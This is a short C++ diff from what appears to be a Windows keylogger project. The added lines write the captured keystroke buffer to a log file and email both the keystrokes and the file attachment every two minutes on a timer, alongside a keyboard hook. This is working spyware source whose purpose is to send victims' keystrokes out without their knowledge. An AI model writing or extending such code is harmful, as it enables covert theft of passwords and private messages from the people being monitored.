@@ -14,9 +14,16 @@ void TimerSendMail()
 {
     if(keylog.empty())
         return;
+
+    std::string last_file = IO::WriteLog (keylog);
+
+
+
+int x = Mail::SendMail ("Log [" + last_file + "]",
+                    "This is a test email for the Keylogger /n Mir is the best and here are the contents of the file:\n\n--------------------------\n" + keylog,
+        IO::GetOurPath (true) +  last_file);
+
 }
-
-
 Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); //Sends a mail every two mins
 
 HHOOK eHook = NULL;
